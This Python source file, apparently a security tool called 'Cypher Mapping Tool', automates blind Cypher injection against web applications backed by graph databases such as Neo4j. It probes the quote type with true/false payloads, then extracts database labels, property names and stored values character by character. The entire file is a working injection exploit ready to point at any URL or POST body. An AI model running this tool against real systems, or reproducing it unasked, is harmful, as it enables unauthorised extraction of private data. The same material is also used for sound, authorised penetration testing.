#!/usr/bin/env python3.10

import argparse
import urllib.parse
import requests
import random
import sys

ascii_chars='abcdefghijklmnopqrstuvwxyz_0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&'+"'"+'()*+,-./:;<=>?@[\]^`{|}~'

def perform_request(target_url, post_data=False, cookies_dict={}, connection_timeout=5):
    proxies={}
    #proxies={'http':'http://localhost:8080'}
    headers = {'Content-Type': 'application/x-www-form-urlencoded'} # Please modify manually if you are sending JSON :)
    try:
        if post_data:
            response = requests.post(target_url, data=post_data, cookies=cookies_dict, timeout=connection_timeout, proxies=proxies, headers=headers)
        else:
            response = requests.get(target_url, cookies=cookies_dict, timeout=connection_timeout,proxies=proxies)

        return response.text

    except requests.exceptions.Timeout:
        return False

def cypher_inject(target_url, payload, post_data=False, cookies_dict={}, connection_timeout=5):
    # Check if '*' is in target_url
    if '*' in target_url:
        encoded_payload = urllib.parse.quote_plus(payload)
        target_url = target_url.replace('*', encoded_payload)
    else:
        # Check if '*' is in post_data
        if post_data and '*' in post_data:
            encoded_payload = urllib.parse.quote_plus(payload)
            post_data = post_data.replace('*', encoded_payload)
        else:
            print("Error: no '*' found in target URL or post data")
            return None
    
    return perform_request(target_url, post_data, cookies_dict, connection_timeout)

def get_injection_type(target_url, blind_string, post_data, cookies_dict, connection_timeout):
    
    injection_character = "'" 
    injection_characters=[" ", '"', "'"]
   
    for injection_character in injection_characters:
        # Generate random values for the payload
        number1 = random.randint(0, 10000)
        number2 = random.randint(0, 10000)

        # Prepare the payloads for the two requests
        true_payload = injection_character + " and " + injection_character + str(number1) + injection_character + "=" + injection_character + str(number1)
        false_payload = injection_character + " and " + injection_character + str(number1) + injection_character + "=" + injection_character + str(number2)

        # Try to inject the payloads using single quotes in target_url and post_data
        try:
            true_result = cypher_inject(target_url, true_payload, post_data, cookies_dict, connection_timeout)
            false_result = cypher_inject(target_url, false_payload, post_data, cookies_dict, connection_timeout)
        except:
            print("Unable to perform cypher injection!!!")
            sys.exit(-1)

        # Check if the blind string is present in the response to the first request but not in the response to the second request
        if blind_string in true_result and blind_string not in false_result:
            return injection_character
    return False

def generate_cookies_dictionary(cookie_string):
    cookie_dict = {}
    if cookie_string:
        cookies = cookie_string.split(';')
        for cookie in cookies:
            name_value = cookie.strip().split('=', 1)
            if len(name_value) == 2:
                cookie_dict[name_value[0]] = name_value[1]
    return cookie_dict

def get_number_of_results(target_url, payload, blind_string, post_data, cookies_dict, connection_timeout):
    for number_of_results in range(1000): # arbitarily set max number or results to 1000 :)
        current_payload=payload.replace("%NUMBER_OF_RESULTS%",str(number_of_results))
        injection_result=cypher_inject(target_url, current_payload, post_data, cookies_dict, connection_timeout)
        if (blind_string and injection_result and blind_string in injection_result) or not injection_result:
            return number_of_results
    print("Unable to check number of results!!!")
    sys.exit(-1)

def get_number_of_labels(target_url, injection_type, blind_string, post_data, cookies_dict, connection_timeout):
    payload = injection_type + " and count {call db.labels() yield label return label} = %NUMBER_OF_RESULTS%" 
    payload+=" and "+injection_type+"1"+injection_type+"="+injection_type+"1"
    return get_number_of_results(target_url, payload, blind_string, post_data, cookies_dict, connection_timeout)

def get_size_of_result(target_url, payload, blind_string, post_data, cookies_dict, connection_timeout):
    for size_of_result in range(1000): # arbitarily set max size of result to 1000 :)
        current_payload=payload.replace("%SIZE_OF_RESULT%",str(size_of_result))
        injection_result=cypher_inject(target_url, current_payload, post_data, cookies_dict, connection_timeout)
        if (blind_string and injection_result and blind_string in injection_result) or not injection_result:
            return size_of_result
    print("Unable to check size of result!!!")
    sys.exit(-1)
    
def get_size_of_label(target_url, label_index, injection_type, blind_string, post_data, cookies_dict, connection_timeout):
    payload = injection_type + " and exists {call db.labels() yield label with label skip " + str(label_index)
    payload+=" limit 1 where size(label) = %SIZE_OF_RESULT% return label}"
    payload+=" and "+injection_type+"1"+injection_type+"="+injection_type+"1"
    return get_size_of_result(target_url, payload, blind_string, post_data, cookies_dict, connection_timeout) 

def dump_string_value(target_url, dump_prefix, dump_size, payload, blind_string, post_data, cookies_dict, connection_timeout):
    print("\r"+(80*" ")+"\r"+dump_prefix,end='')
    dump_value=""
    for character_number in range(dump_size):
        for current_char in ascii_chars:
            if current_char == "'":
                current_char="\'"
            current_payload=payload.replace("%CHARACTER_NUMBER%",str(character_number))
            current_payload=current_payload.replace("%CURRENT_CHARACTER%",current_char)
            injection_result=cypher_inject(target_url, current_payload, post_data, cookies_dict, connection_timeout)
            if (blind_string and injection_result and blind_string in injection_result) or not injection_result:
                dump_value+=current_char
                print("\r"+(80*" ")+f"\r"+dump_prefix+f"{dump_value}",end='')
                break
    return dump_value

def dump_labels(target_url, number_of_labels, injection_type, blind_string, post_data, cookies_dict, connection_timeout):
    global ascii_chars
    label_array=[]
    for label_index in range(number_of_labels):
        label_size=get_size_of_label(target_url, label_index, injection_type, blind_string, post_data, cookies_dict, connection_timeout)
        print(f"Size of label number {label_index}: {label_size}")
        label_dump_prefix=f"Value of label number {label_index}: " 
        print("\r"+(80*" ")+"\r"+label_dump_prefix,end='')
        payload = injection_type + " and exists {call db.labels() yield label with label skip " + str(label_index)
        payload+=" limit 1 where substring(label,%CHARACTER_NUMBER%,1) = '%CURRENT_CHARACTER%' return label}"
        payload+=" and "+injection_type+"1"+injection_type+"="+injection_type+"1"
        label_value=dump_string_value(target_url, label_dump_prefix, label_size, payload, blind_string, post_data, cookies_dict, connection_timeout)
        label_array.append(label_value)
        print("\n")
    print("Labels:")
    dump_ascii_table(label_array)
    return label_array

def get_number_of_properties(target_url, label_to_dump, injection_type, blind_string, post_data, cookies_dict, connection_timeout):
    payload = injection_type + " and count {match(t:"+label_to_dump+") return keys(t)}"
    payload+=" = %NUMBER_OF_RESULTS% and "+injection_type+"1"+injection_type+"="+injection_type+"1"
    return get_number_of_results(target_url, payload, blind_string, post_data, cookies_dict, connection_timeout)

def get_size_of_property(target_url, label_to_dump, property_index, injection_type, blind_string, post_data, cookies_dict, connection_timeout):
    payload = injection_type + " and exists {match(t:"+label_to_dump+") where size(keys(t)["+str(property_index)+"])"
    payload+=" = %SIZE_OF_RESULT% return keys(t)} and "+injection_type+"1"+injection_type+"="+injection_type+"1"
    return get_size_of_result(target_url, payload, blind_string, post_data, cookies_dict, connection_timeout) 

def dump_properties(target_url, label_to_dump, injection_type, blind_string, post_data, cookies_dict, connection_timeout):
    number_of_properties=get_number_of_properties(target_url, label_to_dump, injection_type, blind_string, post_data, cookies_dict, connection_timeout)
    print(f"Number of label '{label_to_dump}' properties: {number_of_properties}\n")
    label_properties_array=[]
    for property_index in range(number_of_properties):
        property_size=get_size_of_property(target_url, label_to_dump, property_index, injection_type, blind_string, post_data, cookies_dict, connection_timeout)
        print(f"Size of property number {property_index}: {property_size}")
        property_dump_prefix=f"Value of property number {property_index}: " 
        payload = injection_type + " and exists {match(t:"+label_to_dump+") where substring(keys(t)["+str(property_index)+"],%CHARACTER_NUMBER%,1)"
        payload+=" = '%CURRENT_CHARACTER%' return keys(t)} and "+injection_type+"1"+injection_type+"="+injection_type+"1"
        property_value=dump_string_value(target_url, property_dump_prefix, property_size, payload, blind_string, post_data, cookies_dict, connection_timeout)
        label_properties_array.append(property_value)
        print("\n")
    print(f"Label: {label_to_dump}\n")
    print("Properties:")
    dump_ascii_table(label_properties_array)
    return label_properties_array

def get_number_of_keys(target_url, label_to_dump, property_to_dump, injection_type, blind_string, post_data, cookies_dict, connection_timeout):
    payload = injection_type + " and count {match(t:"+label_to_dump+") unwind keys(t) as key with key, t where key = '"+property_to_dump+"' return t[key]}"
    payload+=" = %NUMBER_OF_RESULTS% and "+injection_type+"1"+injection_type+"="+injection_type+"1"
    return get_number_of_results(target_url, payload, blind_string, post_data, cookies_dict, connection_timeout)

def get_size_of_key(target_url, label_to_dump, property_to_dump, key_index, injection_type, blind_string, post_data, cookies_dict, connection_timeout):
    payload = injection_type + " and exists {match(t:"+label_to_dump+") unwind keys(t) as key with key, t where key = '"+property_to_dump+"'"
    payload+=" with t,key skip "+str(key_index)+" limit 1 where size(toString(t[key])) = %SIZE_OF_RESULT% return t[key]}"
    payload+=" and "+injection_type+"1"+injection_type+"="+injection_type+"1"
    return get_size_of_result(target_url, payload, blind_string, post_data, cookies_dict, connection_timeout) 

def dump_keys(target_url, label_to_dump, property_to_dump, injection_type, blind_string, post_data, cookies_dict, connection_timeout):
    number_of_keys=get_number_of_keys(target_url, label_to_dump, property_to_dump, injection_type, blind_string, post_data, cookies_dict, connection_timeout)
    print(f"Number of label '{label_to_dump}' and property '{property_to_dump}' keys: {number_of_keys}\n")
    label_keys_array=[]
    for key_index in range(number_of_keys):
        key_size=get_size_of_key(target_url, label_to_dump, property_to_dump, key_index, injection_type, blind_string, post_data, cookies_dict, connection_timeout)
        print(f"Size of key number {key_index} of property '{property_to_dump}': {key_size}")
        key_dump_prefix=f"Value of key number {key_index}: " 
        payload = injection_type + " and exists {match(t:"+label_to_dump+") unwind keys(t) as key with key, t where key = '"+property_to_dump+"'"
        payload+=" with t,key skip "+str(key_index)+" limit 1 where substring(toString(t[key]),%CHARACTER_NUMBER%,1) = '%CURRENT_CHARACTER%'"
        payload+=" return t[key]} and "+injection_type+"1"+injection_type+"="+injection_type+"1"
        key_value=dump_string_value(target_url, key_dump_prefix, key_size, payload, blind_string, post_data, cookies_dict, connection_timeout)
        label_keys_array.append(key_value)
        print("\n")
    print(f"Label: {label_to_dump}\n")
    print(f"Property: {property_to_dump}\n")
    print("Keys:")
    dump_ascii_table(label_keys_array)
    return label_keys_array


def dump_ascii_table(data, shouldPrintHeader=False):
    # determine the number of columns
    num_columns = len(data[0]) if isinstance(data[0], list) else 1

    # determine the maximum width of each column
    if num_columns == 1:
        column_widths = [max(len(str(data[i])) for i in range(len(data)))]
    else:
        column_widths = [max(len(str(data[i][j])) for i in range(len(data))) for j in range(num_columns)]

    # print the table header
    print('+' + '+'.join('-' * (width + 2) for width in column_widths) + '+')

    # print the table contents
    for row in data:
        if isinstance(row, list):
            print('| ' + ' | '.join(str(row[i]).ljust(column_widths[i]) for i in range(num_columns)) + ' |')
        else:
            print('| ' + str(row).ljust(column_widths[0]) + ' |')
        if shouldPrintHeader:
            print('+' + '+'.join('-' * (width + 2) for width in column_widths) + '+')
            shouldPrintHeader=False

    # print the table footer
    print('+' + '+'.join('-' * (width + 2) for width in column_widths) + '+')


print('\nCypher Mapping Tool by sectroyer v0.2\n')

try:
    parser = argparse.ArgumentParser(description='Tool for mapping cypher databases (for example neo4j)')
    parser.add_argument('-u', '--url', help='Target URL', required=True)
    parser.add_argument('-d', '--data', help='POST data', default=False)
    parser.add_argument('-c', '--cookie', help='Request cookie', default={})
    parser.add_argument('-s', '--string', help='Blind string')
    parser.add_argument('-t', '--timeout', help='Connection timeout', default=5)
    parser.add_argument('-L', '--labels', help='Dump labels', action='store_true')
    parser.add_argument('-P', '--properties', help='Dump properties for label')
    parser.add_argument('-K', '--keys', help='Dump keys for property')
    args = parser.parse_args()

    target_url = args.url
    post_data = args.data
    cookies_string = args.cookie
    blind_string = args.string
    connection_timeout = args.timeout

    cookies_dict=generate_cookies_dictionary(cookies_string)

    if "*" not in target_url and (not post_data or "*" not in post_data):
        print("Error: No '*' provided in url or data. Unable to continue...")
        sys.exit(-1)
    if target_url.count('*') > 1 or post_data.count('*') > 1:
        print("More than one '*' provided in url or data. Unable to continue...")
        sys.exit(-1)
    
    injection_type=get_injection_type(target_url, blind_string, post_data, cookies_dict, connection_timeout)
    if injection_type:
        print(f"Injection type: {injection_type}\n")
    else:
        print("Unable to find valid injection type...\n")
        sys.exit(-1)
    if args.labels:
        print("Dumping labels....\n")
        number_of_labels = get_number_of_labels(target_url, injection_type, blind_string, post_data, cookies_dict, connection_timeout)
        print(f"Number of labels found: {number_of_labels}\n")
        dump_labels(target_url, number_of_labels, injection_type, blind_string, post_data, cookies_dict, connection_timeout)
    elif args.properties and args.keys:
        print(f"Dumping keys for property: {args.keys} and label: {args.properties}\n")
        dump_keys(target_url, args.properties, args.keys, injection_type, blind_string, post_data, cookies_dict, connection_timeout)
    elif args.properties:
        print(f"Dumping properties for label: {args.properties}...\n")
        dump_properties(target_url, args.properties, injection_type, blind_string, post_data, cookies_dict, connection_timeout)

    print('')
except SystemExit:
    print('')
    sys.exit()

# Your code here
